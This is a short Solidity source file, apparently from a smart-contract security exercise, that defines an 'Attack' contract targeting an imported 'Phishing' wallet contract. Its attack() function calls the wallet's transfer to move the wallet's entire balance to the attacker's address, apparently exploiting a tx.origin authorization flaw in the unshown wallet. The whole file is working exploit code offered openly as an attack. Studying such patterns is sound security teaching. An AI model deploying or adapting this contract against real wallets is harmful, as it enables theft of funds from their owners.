// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.7;

import "./Phishing.sol";

contract Attack {
    address payable public owner;
    Phishing wallet;

    constructor(Phishing _wallet) {
        wallet = Phishing(_wallet);
        owner = payable(msg.sender);
    }

    function attack() public {
        wallet.transfer(owner, address(wallet).balance);
    }
}
